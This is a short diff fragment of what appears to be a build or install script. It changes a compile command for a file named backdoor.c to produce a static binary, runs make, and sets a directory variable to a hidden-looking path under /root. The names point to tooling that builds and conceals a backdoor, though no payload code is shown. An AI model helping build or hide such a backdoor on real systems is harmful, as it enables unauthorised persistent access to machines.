@@ -1,4 +1,4 @@
-gcc backdoor.c -o backdoor
+gcc backdoor.c -o backdoor -static
 make
 DIR="/root/hide_ts_fuxSocy/"
 
